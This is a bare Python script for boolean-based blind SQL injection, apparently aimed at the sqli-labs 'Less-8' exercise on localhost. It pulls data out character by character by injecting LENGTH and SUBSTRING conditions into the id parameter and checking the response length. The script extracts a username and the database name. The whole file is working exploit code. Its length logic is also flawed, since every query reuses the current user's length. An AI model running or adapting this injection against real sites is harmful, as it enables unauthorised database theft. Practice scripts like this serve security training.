#!/usr/bin/env python
import requests, string

URL = "http://localhost/Less-8/?id=1'"
special_chars = "@"
COMBINATIONS = string.ascii_lowercase + special_chars

def make_request(url):
    try:
        response = requests.get(url)
        return response
    except:
        print("check the url", url)


def check_if_vulnerable(url):
    response = make_request(url)
    if (response.status_code == 200 and len(response.text) == 706):
#        print("Vulnerable to SQL injection")
        return True

def user_length():
    i = 1
    while True:
        url = "%s and LENGTH(current_user)='%s" % (URL, i)
        if check_if_vulnerable(url):
            return i
        else:
            i += 1

def bruteforce_with(query, number, result):
    for i in COMBINATIONS:
        url  = "%s and SUBSTRING(([query]),1,1)='%s" % (URL, str(i))
        url = url.replace("([query]),1,1)", "(%s), %s, 1)" % (query, str(number)))
        if check_if_vulnerable(url):
            print("current letter : %s" % i)
            result.append(i)
            break

def read_data(query, result):
    i = 1
    length = user_length()
    print("[+] Checking data for query: %s \n" % query)
    while i <= length:
        bruteforce_with(query, i, result)
        i += 1

    word = ''.join(result)
    print("[+] Result is %s \n\n" % word)

url = "%s and 1 = '1" % URL
q  = "select username from users where id = 1"
read_data(q, [])
q  = "select database()"
read_data(q, [])
